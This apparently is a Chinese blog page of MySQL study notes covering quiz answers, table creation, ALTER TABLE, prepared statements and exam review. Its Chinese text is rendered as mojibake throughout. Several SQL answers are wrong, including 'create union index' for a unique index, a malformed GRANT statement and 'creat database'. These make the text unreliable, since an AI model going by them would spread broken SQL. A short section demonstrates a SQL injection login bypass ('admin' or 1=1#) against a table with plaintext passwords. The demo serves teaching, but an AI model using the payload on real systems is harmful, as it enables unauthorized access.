join</strong></p><p>åœ¨MySQLä¸­,ç”¨äºå®ç°å·¦å¤–è¿æ¥çš„å…³é”®å­—æ˜¯ï¼š<strong>left join</strong></p><p>å…³ç³»è¡¨ä¸­çš„åˆ—,ä¹Ÿç§°ä½œï¼š<strong>å­—æ®µ</strong></p><p>è®¾å…³ç³»Ræœ‰rä¸ªå±æ€§,å…³ç³»Sæœ‰sä¸ªå±æ€§,å…¶ä¸­æœ‰ä¸€ä¸ªå±æ€§æ˜¯ç›¸åŒçš„,ç»è¿‡Rå’ŒSçš„ç¬›å¡å°”ç§¯æ“ä½œå,å±æ€§ä¸ªæ•°æ˜¯ï¼š<strong>r+s</strong></p><p>ä¸‹åˆ—å…³ç³»ä»£æ•°æ“ä½œä¸­,è¦æ±‚ä¸¤ä¸ªè¿ç®—å¯¹è±¡å…¶å±æ€§ç»“æ„å®Œå…¨ç›¸åŒçš„æ˜¯ï¼š<strong>å¹¶ã€äº¤ã€å·®</strong></p><p>ä¸‹åˆ—èšåˆå‡½æ•°ä¸­,ä¸å¿½ç•¥ç©ºå€¼çš„æ˜¯ï¼š<strong>count(*)</strong></p><p>é£æœºçš„åº§ä½å’Œä¹˜å®¢ä¹‹é—´çš„è”ç³»æ˜¯ï¼š<strong>1:1</strong></p><p>å¦‚æœæƒ³æ‰¾å‡ºå…³ç³»Rçš„å±æ€§Aä¸Šä¸ºç©ºçš„é‚£äº›å…ƒç»„,åˆ™é€‰æ‹©å­å¥åº”è¯¥ä¸ºï¼š<strong>WHERE A IS NULL</strong></p><p>æ¯ä¸ªéƒ¨é—¨æœ‰å¤šåèŒå·¥,æ¯åèŒå·¥åœ¨ä¸€ä¸ªéƒ¨é—¨ä»»èŒ,å®ä½“é›†éƒ¨é—¨ä¸èŒå·¥ä¹‹é—´çš„è”ç³»æ˜¯ï¼š<strong>ä¸€å¯¹å¤š</strong></p><p>SQLè¯­è¨€ä¸­å»ºç«‹æƒŸä¸€æ€§ç´¢å¼•çš„å‘½ä»¤æ˜¯ï¼š<strong>create union index ç´¢å¼•å on åŸºæœ¬è¡¨å(å±æ€§å)</strong></p><p>å®ä½“é›†å­¦ç”Ÿä¸è¯¾ç¨‹ä¹‹é—´çš„è”ç³»æ˜¯ï¼š<strong>å¤šå¯¹å¤š</strong></p><p>å°†æŸ¥è¯¢å…³ç³»Sçš„æƒé™æˆäºˆç”¨æˆ·WANG,å¹¶å…è®¸è¯¥ç”¨æˆ·å°†æ­¤æƒé™æˆäºˆå…¶ä»–ç”¨æˆ·ã€‚å®ç°æ­¤<br>åŠŸèƒ½çš„SQLè¯­å¥æ˜¯ï¼š<strong>grant select to s wang with grant option</strong></p><p>é•¿æœŸå­˜å‚¨åœ¨è®¡ç®—æœºå†…ã€æœ‰ç»„ç»‡çš„ã€ç»Ÿä¸€ç®¡ç†çš„ç›¸å…³æ•°æ®çš„é›†åˆç§°ä¸ºï¼š<strong>æ•°æ®åº“</strong><br>ä¸èƒ½æ¿€æ´»è§¦å‘å™¨æ‰§è¡Œçš„äº‹ä»¶æ˜¯ï¼š<strong>select</strong></p><p>æŸ¥çœ‹è§¦å‘å™¨å†…å®¹çš„è¯­å¥æ˜¯ï¼š<strong>select * from triggers;</strong></p><p>åœ¨MySQLä¸­,ä½¿ç”¨å…³é”®å­—AUTO_INCREMENTè®¾ç½®è‡ªå¢å±æ€§æ—¶,è¦æ±‚è¯¥å±æ€§åˆ—çš„æ•°æ®ç±»å‹æ˜¯ï¼š<strong>int(æ•´æ•°)</strong></p><p>å¦‚æœDELETEè¯­å¥ä¸­æ²¡æœ‰ä½¿ç”¨WHEREå­å¥,åˆ™ä¸‹åˆ—å™è¿°ä¸­æ­£ç¡®çš„æ˜¯ï¼š<strong>åˆ é™¤è¡¨ä¸­çš„æ‰€æœ‰è®°å½•</strong></p><p>MySQLä¸­,æ¿€æ´»è§¦å‘å™¨çš„å‘½ä»¤åŒ…æ‹¬ï¼š<strong>INSERTã€DELETE ã€UPDATE</strong></p><p>ä½¿ç”¨å…³é”®å­—CALLå¯ä»¥è°ƒç”¨çš„æ•°æ®åº“å¯¹è±¡æ˜¯ï¼š<strong>å‚¨å­˜è¿‡ç¨‹</strong></p><p>åœ¨å­˜å‚¨è¿‡ç¨‹ä¸­,ä½¿ç”¨æ¸¸æ ‡çš„ä¸€èˆ¬æµç¨‹æ˜¯ï¼š<strong>å£°æ˜æ‰“å¼€è¯»å–å…³é—­</strong></p><p>åœ¨MySQLä¸­,INSERTè§¦å‘å™¨æ“ä½œæ•°æ®æ—¶,å¯ä»¥ä½¿ç”¨çš„ä¸´æ—¶è¡¨æ˜¯ï¼š<strong>new</strong></p><p>æ•°æ®æ¨¡å‹çš„ç±»å‹ä¸»è¦æœ‰ï¼š<strong>æ¦‚å¿µã€é€»è¾‘ã€ç‰©ç†æ¨¡å‹</strong></p><p>æ•°æ®åº“ç³»ç»Ÿä¸­çš„æ•°æ®æ¨¡å‹æœ‰ï¼š<strong>å±‚æ¬¡ã€ç½‘çŠ¶ã€å…³ç³»æ¨¡å‹</strong></p><p>MySQLä¸­çš„å˜é‡å¯åˆ†ä¸ºï¼š<strong>ç³»ç»Ÿã€ç”¨æˆ·ã€å±€éƒ¨å˜é‡</strong></p><p>ä¸‹é¢å“ªäº›æ˜¯å¸¸è§çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼š<strong>ACCESSã€SQL Serverã€ Oracleã€MySQLã€FoxProå’ŒSybaseç­‰</strong></p><p>ä¸‹åˆ—å™è¿°æ­£ç¡®çš„æ˜¯(<strong>A</strong>)ï¼ˆ1.0åˆ†ï¼‰</p><p><strong>Aã€ORDER BYå­å¥æ‰€äº§ç”Ÿçš„è¾“å‡ºåªæ˜¯é€»è¾‘æ’åºæ•ˆæœ,å¹¶æ²¡æœ‰å½±å“è¡¨çš„å®é™…å†…å®¹</strong></p><p>Bã€åœ¨ORDER BYå­å¥ååªèƒ½æœ‰ä¸€ä¸ªå±æ€§</p><p>Cã€ORDER BYå­å¥ä¸­å¿…é¡»æŒ‡æ˜æ˜¯å‡åºæˆ–é™åº,ä¸èƒ½ç¼ºçœ</p><p>Dã€è¿›è¡Œæœ‰åºè¾“å‡ºæ—¶,å¦‚æœåˆ—ä¸­æœ‰ç©ºå€¼åˆ™åœ¨å‡åºè¾“å‡ºæ—¶é¦–å…ˆåˆ—å‡ºç©ºå€¼é¡¹,è€Œåœ¨é™åºæ—¶æœ€å<br>åˆ—å‡ºç©ºå€¼é¡¹</p><h1 id="MySQLå­¦ä¹ ç¬”è®°"><a href="#MySQLå­¦ä¹ ç¬”è®°" class="headerlink" title="MySQLå­¦ä¹ ç¬”è®°"></a>MySQLå­¦ä¹ ç¬”è®°</h1><h1 id="åˆ›å»ºgoodsï¼ˆè´§ç‰©ï¼‰è¡¨ç»“æ„"><a href="#åˆ›å»ºgoodsï¼ˆè´§ç‰©ï¼‰è¡¨ç»“æ„" class="headerlink" title="åˆ›å»ºgoodsï¼ˆè´§ç‰©ï¼‰è¡¨ç»“æ„"></a>åˆ›å»ºgoodsï¼ˆè´§ç‰©ï¼‰è¡¨ç»“æ„</h1><h2 id="1-åˆ›å»ºæ•°æ®åº“db-shop"><a href="#1-åˆ›å»ºæ•°æ®åº“db-shop" class="headerlink" title="1.åˆ›å»ºæ•°æ®åº“db_shop"></a>1.åˆ›å»ºæ•°æ®åº“db_shop</h2><pre><code>create database db_shop;</code></pre><h2 id="2-é€‰æ‹©æ•°æ®åº“"><a href="#2-é€‰æ‹©æ•°æ®åº“" class="headerlink" title="2.é€‰æ‹©æ•°æ®åº“"></a>2.é€‰æ‹©æ•°æ®åº“</h2><pre><code>use db_shop;</code></pre><h2 id="3-åˆ›å»ºæ•°æ®è¡¨"><a href="#3-åˆ›å»ºæ•°æ®è¡¨" class="headerlink" title="3.åˆ›å»ºæ•°æ®è¡¨"></a>3.åˆ›å»ºæ•°æ®è¡¨</h2><pre><code>create table goods(id int(11) primary key auto_increment,type varchar(30) not null,name varchar(30) unique,price decimal(7,2) unsigned,num int(11) default 0,add_time datetime);</code></pre><h2 id="4-æ·»åŠ è¡¨å•æ•°æ®"><a href="#4-æ·»åŠ è¡¨å•æ•°æ®" class="headerlink" title="4.æ·»åŠ è¡¨å•æ•°æ®"></a>4.æ·»åŠ è¡¨å•æ•°æ®</h2><pre><code>show tables;select * from goods;insert into goods(id,type,name) values(1,&#39;ä¹¦ç±&#39;,&#39;æ¨äº‘å‡¯çš„æˆåŠŸå­¦&#39;);</code></pre><h2 id="5-å‘è¡¨ä¸­çš„æ‰€æœ‰åˆ—æ’å…¥æ•°æ®ï¼š"><a href="#5-å‘è¡¨ä¸­çš„æ‰€æœ‰åˆ—æ’å…¥æ•°æ®ï¼š" class="headerlink" title="5.å‘è¡¨ä¸­çš„æ‰€æœ‰åˆ—æ’å…¥æ•°æ®ï¼š"></a>5.å‘è¡¨ä¸­çš„æ‰€æœ‰åˆ—æ’å…¥æ•°æ®ï¼š</h2><pre><code>insert into goods values(1,&#39;slave&#39;,&#39;ç‹å›½å¼ºçš„è„‘è¢‹&#39;,1,1,&#39;2021-3-29&#39;),(2,&#39;slave&#39;,&#39;ç‹å›½å¼ºçš„æ‰‹&#39;,1,1,&#39;2021-3-29&#39;),(3,&#39;slave&#39;,&#39;ç‹å›½å¼ºçš„è„š&#39;,1,1,&#39;2021-3-29&#39;),(4,&#39;slave&#39;,&#39;ç‹å›½å¼ºçš„çœ¼ç å­&#39;,1,1,&#39;2021-3-29&#39;);</code></pre><h2 id="6-åˆ›å»ºæ–°è¡¨ï¼š"><a href="#6-åˆ›å»ºæ–°è¡¨ï¼š" class="headerlink" title="6.åˆ›å»ºæ–°è¡¨ï¼š"></a>6.åˆ›å»ºæ–°è¡¨ï¼š</h2><pre><code>create table new_goods(id int(11) primary key auto_increment,type varchar(30) not null,name varchar(30) unique,price decimal(7,2) unsigned,num int(11) default 0,add_time datetime);</code></pre><h2 id="7-å°†goodsçš„å†…å®¹æ’å…¥åˆ°new-goodsä¸­ï¼š"><a href="#7-å°†goodsçš„å†…å®¹æ’å…¥åˆ°new-goodsä¸­ï¼š" class="headerlink" title="7.å°†goodsçš„å†…å®¹æ’å…¥åˆ°new_goodsä¸­ï¼š"></a>7.å°†goodsçš„å†…å®¹æ’å…¥åˆ°new_goodsä¸­ï¼š</h2><pre><code>insert into new_goods() select *from goods;</code></pre><h2 id="å®æ“1-school-ï¼š"><a href="#å®æ“1-school-ï¼š" class="headerlink" title="å®æ“1(school)ï¼š"></a>å®æ“1(school)ï¼š</h2><h3 id="1-åˆ›å»ºæ•°æ®åº“schoolå¹¶ä½¿ç”¨"><a href="#1-åˆ›å»ºæ•°æ®åº“schoolå¹¶ä½¿ç”¨" class="headerlink" title="1.åˆ›å»ºæ•°æ®åº“schoolå¹¶ä½¿ç”¨:"></a>1.åˆ›å»ºæ•°æ®åº“schoolå¹¶ä½¿ç”¨:</h3><pre><code>creat database school;use school;</code></pre><h3 id="2-åˆ›å»ºè¡¨musicï¼š"><a href="#2-åˆ›å»ºè¡¨musicï¼š" class="headerlink" title="2.åˆ›å»ºè¡¨musicï¼š"></a>2.åˆ›å»ºè¡¨musicï¼š</h3><p>unsigned(ä¸èƒ½ä¸ºè´Ÿæ•°)</p><pre><code>creat table music(id int(11) unsigned not null auto_increment,name varchar(20) not null,primary key(id));</code></pre><h1 id="sqlæ³¨å…¥å®æ“è¯­å¥ï¼š"><a href="#sqlæ³¨å…¥å®æ“è¯­å¥ï¼š" class="headerlink" title="sqlæ³¨å…¥å®æ“è¯­å¥ï¼š"></a>sqlæ³¨å…¥å®æ“è¯­å¥ï¼š</h1><pre><code>create table user(id int(11) primary key auto_increment,uname varchar(30) not null,passwd varchar(30) unique,add_time datetime);</code></pre><pre><code>insert into user(id,uname,passwd) values(1,&#39;admin&#39;,&#39;123&#39;);</code></pre><pre><code>select * from user where uname = &#39;admin&#39; or 1=1#&#39; and passwd = &#39;123&#39;;</code></pre><h1 id="MySQL-ALTERå‘½ä»¤ï¼š"><a href="#MySQL-ALTERå‘½ä»¤ï¼š" class="headerlink" title="MySQL ALTERå‘½ä»¤ï¼š"></a>MySQL ALTERå‘½ä»¤ï¼š</h1><p>å½“æˆ‘ä»¬éœ€è¦ä¿®æ”¹æ•°æ®è¡¨åæˆ–è€…ä¿®æ”¹æ•°æ®è¡¨å­—æ®µæ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨åˆ°MySQL ALTERå‘½ä»¤ã€‚</p><p>åˆ›å»ºèœé¸Ÿæ•°æ®åº“å¹¶ä½¿ç”¨ï¼š</p><pre><code>creat database runoob;use runoob;</code></pre><p>åˆ›å»ºè¡¨ï¼š</p><pre><code>create table alter_tbl(i INT,c CHAR(1));</code></pre><h2 id="åˆ é™¤ï¼Œæ·»åŠ æˆ–ä¿®æ”¹è¡¨å­—æ®µï¼š"><a href="#åˆ é™¤ï¼Œæ·»åŠ æˆ–ä¿®æ”¹è¡¨å­—æ®µï¼š" class="headerlink" title="åˆ é™¤ï¼Œæ·»åŠ æˆ–ä¿®æ”¹è¡¨å­—æ®µï¼š"></a>åˆ é™¤ï¼Œæ·»åŠ æˆ–ä¿®æ”¹è¡¨å­—æ®µï¼š</h2><p>å¦‚ä¸‹å‘½ä»¤ä½¿ç”¨äº† ALTER å‘½ä»¤åŠ DROP å­å¥æ¥åˆ é™¤ä»¥ä¸Šåˆ›å»ºè¡¨çš„ i å­—æ®µï¼š</p><pre><code>ALTER TABLE alter_tb  DROP i;</code></pre><p>å¦‚æœæ•°æ®è¡¨ä¸­åªå‰©ä½™ä¸€ä¸ªå­—æ®µåˆ™æ— æ³•ä½¿ç”¨DROPæ¥åˆ é™¤å­—æ®µã€‚</p><p>MySQL ä¸­ä½¿ç”¨ ADD å­å¥æ¥å‘æ•°æ®è¡¨ä¸­æ·»åŠ åˆ—ï¼Œå¦‚ä¸‹å®ä¾‹åœ¨è¡¨ alter_tb ä¸­æ·»åŠ  i å­—æ®µï¼Œå¹¶å®šä¹‰æ•°æ®ç±»å‹:</p><pre><code>ALTER TABLE alter_tb ADD i INT;</code></pre><p>æ‰§è¡Œä»¥ä¸Šå‘½ä»¤åï¼Œi å­—æ®µä¼šè‡ªåŠ¨æ·»åŠ åˆ°æ•°æ®è¡¨å­—æ®µçš„æœ«å°¾ã€‚</p><p>å¦‚æœä½ éœ€è¦æŒ‡å®šæ–°å¢å­—æ®µçš„ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨MySQLæä¾›çš„å…³é”®å­— FIRST (è®¾å®šä½ç¬¬ä¸€åˆ—)ï¼Œ AFTER å­—æ®µåï¼ˆè®¾å®šä½äºæŸä¸ªå­—æ®µä¹‹åï¼‰ã€‚</p><p>å°è¯•ä»¥ä¸‹ ALTER TABLE è¯­å¥, åœ¨æ‰§è¡ŒæˆåŠŸåï¼Œä½¿ç”¨ SHOW COLUMNS æŸ¥çœ‹è¡¨ç»“æ„çš„å˜åŒ–ï¼š</p><pre><code>ALTER TABLE alter_tb DROP i;ALTER TABLE alter_tb ADD i INT FIRST;ALTER TABLE alter_tb DROP i;ALTER TABLE alter_tb ADD i INT AFTER c;</code></pre><p>FIRST å’Œ AFTER å…³é”®å­—å¯ç”¨äº ADD ä¸ MODIFY å­å¥ï¼Œæ‰€ä»¥å¦‚æœä½ æƒ³é‡ç½®æ•°æ®è¡¨å­—æ®µçš„ä½ç½®å°±éœ€è¦å…ˆä½¿ç”¨ DROP åˆ é™¤å­—æ®µç„¶åä½¿ç”¨ ADD æ¥æ·»åŠ å­—æ®µå¹¶è®¾ç½®ä½ç½®ã€‚</p><h2 id="ä¿®æ”¹å­—æ®µç±»å‹åŠåç§°"><a href="#ä¿®æ”¹å­—æ®µç±»å‹åŠåç§°" class="headerlink" title="ä¿®æ”¹å­—æ®µç±»å‹åŠåç§°"></a>ä¿®æ”¹å­—æ®µç±»å‹åŠåç§°</h2><p>å¦‚æœéœ€è¦ä¿®æ”¹å­—æ®µç±»å‹åŠåç§°, ä½ å¯ä»¥åœ¨ALTERå‘½ä»¤ä¸­ä½¿ç”¨ MODIFY æˆ– CHANGE å­å¥ ã€‚</p><p>ä¾‹å¦‚ï¼ŒæŠŠå­—æ®µ c çš„ç±»å‹ä» CHAR(1) æ”¹ä¸º CHAR(10)ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤:</p><pre><code>ALTER TABLE alter_tb MODIFY c CHAR(10);</code></pre><p>ä½¿ç”¨ CHANGE å­å¥, è¯­æ³•æœ‰å¾ˆå¤§çš„ä¸åŒã€‚ åœ¨ CHANGE å…³é”®å­—ä¹‹åï¼Œç´§è·Ÿç€çš„æ˜¯ä½ è¦ä¿®æ”¹çš„å­—æ®µåï¼Œç„¶åæŒ‡å®šæ–°å­—æ®µååŠç±»å‹ã€‚å°è¯•å¦‚ä¸‹å®ä¾‹ï¼š</p><pre><code>ALTER TABLE alter_tb CHANGE i j BIGINT;ALTER TABLE alter_tb CHANGE j j INT;</code></pre><h2 id="ä¿®æ”¹å­—æ®µé»˜è®¤å€¼ï¼š"><a href="#ä¿®æ”¹å­—æ®µé»˜è®¤å€¼ï¼š" class="headerlink" title="ä¿®æ”¹å­—æ®µé»˜è®¤å€¼ï¼š"></a>ä¿®æ”¹å­—æ®µé»˜è®¤å€¼ï¼š</h2><pre><code>ALTER TABLE alter_tb ALTER i SET DEFAULT 1000;SHOW COLUMNS FROM alter_tb;+-------+---------+------+-----+---------+-------+| Field | Type    | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| c     | char(1) | YES  |     | NULL    |       || i     | int(11) | YES  |     | 1000    |       |+-------+---------+------+-----+---------+-------+2 rows in set (0.00 sec)</code></pre><p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ ALTER å‘½ä»¤åŠ DROPå­å¥æ¥åˆ é™¤å­—æ®µçš„é»˜è®¤å€¼ï¼Œå¦‚ä¸‹å®ä¾‹ï¼š</p><pre><code>ALTER TABLE alter_tb ALTER i DROP DEFAULT;SHOW COLUMNS FROM alter_tb;+-------+---------+------+-----+---------+-------+| Field | Type    | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| c     | char(1) | YES  |     | NULL    |       || i     | int(11) | YES  |     | NULL    |       |+-------+---------+------+-----+---------+-------+2 rows in set (0.00 sec)Changing a Table Type:</code></pre><h2 id="ä¿®æ”¹è¡¨åï¼š"><a href="#ä¿®æ”¹è¡¨åï¼š" class="headerlink" title="ä¿®æ”¹è¡¨åï¼š"></a><strong>ä¿®æ”¹è¡¨åï¼š</strong></h2><p>å¦‚æœéœ€è¦ä¿®æ”¹æ•°æ®è¡¨çš„åç§°ï¼Œå¯ä»¥åœ¨ ALTER TABLE è¯­å¥ä¸­ä½¿ç”¨ RENAME å­å¥æ¥å®ç°ã€‚</p><p>å°è¯•ä»¥ä¸‹å®ä¾‹å°†æ•°æ®è¡¨ alter_tb é‡å‘½åä¸º alter_tblï¼š</p><pre><code>ALTER TABLE alter_tb RENAME TO alter_tbl;</code></pre><h1 id="MySQLé¢„ç¼–è¯‘ï¼š"><a href="#MySQLé¢„ç¼–è¯‘ï¼š" class="headerlink" title="MySQLé¢„ç¼–è¯‘ï¼š"></a>MySQLé¢„ç¼–è¯‘ï¼š</h1><h2 id="1-é¢„ç¼–è¯‘ç›¸å…³è¯­æ³•å¦‚ä¸‹ï¼š"><a href="#1-é¢„ç¼–è¯‘ç›¸å…³è¯­æ³•å¦‚ä¸‹ï¼š" class="headerlink" title="1.é¢„ç¼–è¯‘ç›¸å…³è¯­æ³•å¦‚ä¸‹ï¼š"></a>1.é¢„ç¼–è¯‘ç›¸å…³è¯­æ³•å¦‚ä¸‹ï¼š</h2><pre><code>setç”¨äºè®¾ç½®å˜é‡åå’Œå€¼prepareç”¨äºé¢„å¤‡ä¸€ä¸ªè¯­å¥ï¼Œå¹¶èµ‹äºˆåç§°ï¼Œä»¥åå¯ä»¥å¼•ç”¨è¯¥è¯­å¥executeæ‰§è¡Œè¯­å¥deallocate prepareç”¨æ¥é‡Šæ”¾æ‰é¢„å¤„ç†çš„è¯­å¥</code></pre><h2 id="2-å¸¸ç”¨æ“ä½œ"><a href="#2-å¸¸ç”¨æ“ä½œ" class="headerlink" title="2:å¸¸ç”¨æ“ä½œ"></a>2:å¸¸ç”¨æ“ä½œ</h2><p> 1:åˆ›å»ºé¢„å¤„ç†è¯­å¥</p><p>  prepare stmt_name from â€˜select * from t_copy where id&gt;?â€™;</p><h3 id="2-è®¾ç½®ä¸€ä¸ªå…¨å±€çš„å˜é‡"><a href="#2-è®¾ç½®ä¸€ä¸ªå…¨å±€çš„å˜é‡" class="headerlink" title="2:è®¾ç½®ä¸€ä¸ªå…¨å±€çš„å˜é‡"></a>2:è®¾ç½®ä¸€ä¸ªå…¨å±€çš„å˜é‡</h3><p>  set @ i=5;</p><h3 id="3-æ‰§è¡Œstmt-nameé¢„å¤„ç†è¯­å¥"><a href="#3-æ‰§è¡Œstmt-nameé¢„å¤„ç†è¯­å¥" class="headerlink" title="3:æ‰§è¡Œstmt_nameé¢„å¤„ç†è¯­å¥"></a>3:æ‰§è¡Œstmt_nameé¢„å¤„ç†è¯­å¥</h3><p>  execute stmt_name using @i;</p><h3 id="4-åˆ é™¤é¢„å¤„ç†"><a href="#4-åˆ é™¤é¢„å¤„ç†" class="headerlink" title="4:åˆ é™¤é¢„å¤„ç†"></a>4:åˆ é™¤é¢„å¤„ç†</h3><p>  drop prepare stmt_name </p><p>åŒæ—¶ä¹Ÿå¯ä»¥å…ˆç°è®¾ç½®é¢„ç¼–è¯‘çš„è¯­å¥ï¼š</p><pre><code>@p = &#39;user&#39;;@sql = concat(&#39;select * from&#39;,@p);prepare stmt_name from @sql;execute stmt_name;drop prepare stmt_name;</code></pre><h1 id="MySQLæœŸä¸­è€ƒè¯•å¤ä¹ é¢˜"><a href="#MySQLæœŸä¸­è€ƒè¯•å¤ä¹ é¢˜" class="headerlink" title="MySQLæœŸä¸­è€ƒè¯•å¤ä¹ é¢˜"></a>MySQLæœŸä¸­è€ƒè¯•å¤ä¹ é¢˜</h1><h2 id="ç¬¬ä¸€éƒ¨åˆ†"><a href="#ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†"></a>ç¬¬ä¸€éƒ¨åˆ†</h2><h3 id="ä¸€ã€å»ºç«‹æ•°æ®åº“"><a href="#ä¸€ã€å»ºç«‹æ•°æ®åº“" class="headerlink" title="ä¸€ã€å»ºç«‹æ•°æ®åº“"></a>ä¸€ã€å»ºç«‹æ•°æ®åº“</h3><h4 id="1ã€è¯·å»ºç«‹æ•°æ®åº“ï¼Œæ•°æ®åº“åä¸ºstudentdb1"><a href="#1ã€è¯·å»ºç«‹æ•°æ®åº“ï¼Œæ•°æ®åº“åä¸ºstudentdb1" class="headerlink" title="1ã€è¯·å»ºç«‹æ•°æ®åº“ï¼Œæ•°æ®åº“åä¸ºstudentdb1"></a>1ã€è¯·å»ºç«‹æ•°æ®åº“ï¼Œæ•°æ®åº“åä¸ºstudentdb1</h4><p>Create database studentdb1;</p><h4 id="2ã€é€‰æ‹©æ•°æ®åº“"><a href="#2ã€é€‰æ‹©æ•°æ®åº“" class="headerlink" title="2ã€é€‰æ‹©æ•°æ®åº“"></a>2ã€é€‰æ‹©æ•°æ®åº“</h4><p>Use studentdb1;</p><h3 id="äºŒã€å»ºç«‹æ•°æ®è¡¨"><a href="#äºŒã€å»ºç«‹æ•°æ®è¡¨" class="headerlink" title="äºŒã€å»ºç«‹æ•°æ®è¡¨"></a>äºŒã€å»ºç«‹æ•°æ®è¡¨</h3><h4 id="1ã€å»ºç«‹studentå­¦ç”Ÿè¡¨ã€‚"><a href="#1ã€å»ºç«‹studentå­¦ç”Ÿè¡¨ã€‚" class="headerlink" title="1ã€å»ºç«‹studentå­¦ç”Ÿè¡¨ã€‚"></a>1ã€å»ºç«‹studentå­¦ç”Ÿè¡¨ã€‚</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µç±»å‹</th><th>å­—æ®µé•¿åº¦</th><th>çº¦æŸ</th></tr></thead><tbody><tr><td>Sno</td><td>varchar</td><td>20</td><td>Primary key</td></tr><tr><td>sname</td><td>varchar</td><td>10</td><td>Not null</td></tr><tr><td>sage</td><td>int</td><td></td><td>null</td></tr><tr><td>ssex</td><td>varchar</td><td>4</td><td>null</td></tr></tbody></table><pre><code>Create  table  student(Sno  varchar(20)  primary key,Sname  varchar(40)  not null,Sage  int  ,Ssex  varchar(4));</code></pre><h4 id="2ã€å»ºç«‹courseè¯¾ç¨‹è¡¨"><a href="#2ã€å»ºç«‹courseè¯¾ç¨‹è¡¨" class="headerlink" title="2ã€å»ºç«‹courseè¯¾ç¨‹è¡¨"></a>2ã€å»ºç«‹courseè¯¾ç¨‹è¡¨</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µç±»å‹</th><th>å­—æ®µé•¿åº¦</th><th>çº¦æŸ</th></tr></thead><tbody><tr><td>Cno</td><td>varchar</td><td>20</td><td>Primary key</td></tr><tr><td>Cname</td><td>varchar</td><td>10</td><td>Not null</td></tr><tr><td>Tno</td><td>varchar</td><td>20</td><td>null</td></tr></tbody></table><pre><code>Create table course(Cno varchar(20) primary key,Cname varchar(10) not null,Tno varchar(20) );</code></pre><h4 id="3ã€å»ºç«‹scæˆç»©è¡¨"><a href="#3ã€å»ºç«‹scæˆç»©è¡¨" class="headerlink" title="3ã€å»ºç«‹scæˆç»©è¡¨"></a>3ã€å»ºç«‹scæˆç»©è¡¨</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µç±»å‹</th><th>å­—æ®µé•¿åº¦</th><th>çº¦æŸ</th></tr></thead><tbody><tr><td>Sno</td><td>varchar</td><td>20</td><td>Not null</td></tr><tr><td>Cno</td><td>varchar</td><td>20</td><td>Not null</td></tr><tr><td>score</td><td>int</td><td></td><td>null</td></tr></tbody></table><pre><code>Create table sc(Sno varchar(20) not null,Cno varchar(20) not null,Score int );</code></pre><h4 id="4ã€å»ºç«‹Teacheræ•™å¸ˆè¡¨"><a href="#4ã€å»ºç«‹Teacheræ•™å¸ˆè¡¨" class="headerlink" title="4ã€å»ºç«‹Teacheræ•™å¸ˆè¡¨"></a>4ã€å»ºç«‹Teacheræ•™å¸ˆè¡¨</h4><table><thead><tr><th>å­—æ®µå</th><th>å­—æ®µç±»å‹</th><th>å­—æ®µé•¿åº¦</th><th>çº¦æŸ</th></tr></thead><tbody><tr><td>Tno</td><td>varchar</td><td>20</td><td>Primary key</td></tr><tr><td>Tname</td><td>varchar</td><td>10</td><td>Not null</td></tr></tbody></table><pre><code>Create table teacher(Tno varchar(20) primary key,Tname varchar(10) not null);</code></pre><h3 id="ä¸‰ã€æŸ¥çœ‹æ•°æ®è¡¨çš„ç»“æ„"><a href="#ä¸‰ã€æŸ¥çœ‹æ•°æ®è¡¨çš„ç»“æ„" class="headerlink" title="ä¸‰ã€æŸ¥çœ‹æ•°æ®è¡¨çš„ç»“æ„"></a><strong>ä¸‰ã€æŸ¥çœ‹æ•°æ®è¡¨çš„ç»“æ„</strong></h3><h4 id="1ã€ä½¿ç”¨describeè¯­å¥æŸ¥çœ‹studentæ•°æ®è¡¨çš„ç»“æ„æ•°æ®ï¼›"><a href="#1ã€ä½¿ç”¨describeè¯­å¥æŸ¥çœ‹studentæ•°æ®è¡¨çš„ç»“æ„æ•°æ®ï¼›" class="headerlink" title="1ã€ä½¿ç”¨describeè¯­å¥æŸ¥çœ‹studentæ•°æ®è¡¨çš„ç»“æ„æ•°æ®ï¼›"></a>1ã€ä½¿ç”¨describeè¯­å¥æŸ¥çœ‹studentæ•°æ®è¡¨çš„ç»“æ„æ•°æ®ï¼›</h4><p>Desc student;  </p><p>Describe student;</p><h4 id="1ã€ä½¿ç”¨show-create-tableæŸ¥çœ‹courseæ•°æ®è¡¨çš„ç»“æ„ä¿¡æ¯ï¼›"><a href="#1ã€ä½¿ç”¨show-create-tableæŸ¥çœ‹courseæ•°æ®è¡¨çš„ç»“æ„ä¿¡æ¯ï¼›" class="headerlink" title="1ã€ä½¿ç”¨show create tableæŸ¥çœ‹courseæ•°æ®è¡¨çš„ç»“æ„ä¿¡æ¯ï¼›"></a>1ã€ä½¿ç”¨show create tableæŸ¥çœ‹courseæ•°æ®è¡¨çš„ç»“æ„ä¿¡æ¯ï¼›</h4><p>Show create table course \G</p><p><strong>(\G:å°†æŸ¥è¯¢åˆ°çš„æ¨ªå‘è¡¨æ ¼çºµå‘è¾“å‡ºï¼Œæ–¹ä¾¿é˜…è¯»ï¼Œ\g:ç­‰ä»·äºâ€œï¼›â€)</strong></p><h3 id="å››ã€ä¿®æ”¹æ•°æ®è¡¨ç»“æ„ï¼ˆå‚è€ƒè¯¾æœ¬P74-78é¡µï¼‰"><a href="#å››ã€ä¿®æ”¹æ•°æ®è¡¨ç»“æ„ï¼ˆå‚è€ƒè¯¾æœ¬P74-78é¡µï¼‰" class="headerlink" title="å››ã€ä¿®æ”¹æ•°æ®è¡¨ç»“æ„ï¼ˆå‚è€ƒè¯¾æœ¬P74-78é¡µï¼‰"></a><strong>å››ã€ä¿®æ”¹æ•°æ®è¡¨ç»“æ„ï¼ˆå‚è€ƒè¯¾æœ¬P74-78é¡µï¼‰</strong></h3><p><strong>1ã€å°†æ•°æ®è¡¨SCçš„åç§°ä¿®æ”¹ä¸ºstuScoreã€‚</strong></p><p>Alter table sc <strong>rename</strong> stuscore;</p><p>æ”¹å®Œä»¥åæŸ¥çœ‹æ•°æ®è¡¨ï¼šdesc 